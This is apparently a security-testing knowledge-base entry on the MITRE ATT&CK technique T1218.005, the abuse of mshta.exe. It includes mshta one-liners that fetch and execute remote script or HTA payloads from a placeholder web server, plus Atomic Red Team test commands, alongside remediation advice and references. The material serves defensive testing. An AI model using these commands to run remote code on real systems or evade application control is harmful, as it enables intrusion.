---
name: "T1218.005_mshta"
description: "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1218.005
  - defense-evasion
  - windows
  - sub-technique
technique_id: "T1218.005"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1218/005"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1218
  - T1218.001
  - T1218.002
  - T1218.003
  - T1218.004
  - T1218.007
  - T1218.008
  - T1218.009
  - T1218.010
  - T1218.011
  - T1218.012
  - T1218.013
  - T1218.014
  - T1218.015
prerequisites:
  - T1218
severity_boost:
  T1218: "Chain with T1218 for deeper attack path"
  T1218.001: "Chain with T1218.001 for deeper attack path"
  T1218.002: "Chain with T1218.002 for deeper attack path"
---

# T1218.005 Mshta

> **Sub-technique of:** T1218

## High-Level Description

Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. 

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if Mshta technique is applicable to target environment
- [ ] Check Windows systems for indicators of Mshta
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject

Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.

**Supported Platforms:** windows

```cmd
mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
```

### Atomic Test 2: Mshta executes VBScript to execute malicious command

Run a local VB script to run local user enumeration powershell command.
This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
Upon execution, a new PowerShell windows will be opened that displays user information.

**Supported Platforms:** windows

```cmd
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close")
```

### Atomic Test 3: Mshta Executes Remote HTML Application (HTA)

Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.

**Supported Platforms:** windows

```powershell
$var =Invoke-WebRequest "#{hta_url}"
$var.content|out-file "#{temp_file}"
mshta "#{temp_file}"
start-sleep -s 15
stop-process -name "calculator" -Force -ErrorAction Ignore
stop-process -name "CalculatorApp" -Force -ErrorAction Ignore
```

### Atomic Test 4: Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement

Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.

**Supported Platforms:** windows

```powershell
Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}
```

**Dependencies:**
- The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.

### Atomic Test 5: Invoke HTML Application - Jscript Engine Simulating Double Click

Executes an HTA Application using JScript script engine simulating double click.

**Supported Platforms:** windows

```powershell
Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick
```

**Dependencies:**
- The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Mshta by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1218.005 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1038 Execution Prevention
Use application control configured to block execution of <code>mshta.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>mshta.exe</code> application and to prevent abuse.

### M1042 Disable or Remove Feature or Program
Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life.


## Detection

### Detecting Mshta-based Proxy Execution via Suspicious HTA or Script Invocation


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Mshta technique applicable | Medium | Defense Evasion |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-693 | Protection Mechanism Failure |


## References

- [Cylance Dust Storm](https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf)
- [Red Canary HTA Abuse Part Deux](https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/)
- [FireEye Attacks Leveraging HTA](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html)
- [Airbus Security Kovter Analysis](https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/)
- [FireEye FIN7 April 2017](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)
- [Wikipedia HTML Application](https://en.wikipedia.org/wiki/HTML_Application)
- [MSDN HTML Applications](https://msdn.microsoft.com/library/ms536471.aspx)
- [LOLBAS Mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
- [Atomic Red Team - T1218.005](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1218.005)
- [MITRE ATT&CK - T1218.005](https://attack.mitre.org/techniques/T1218/005)
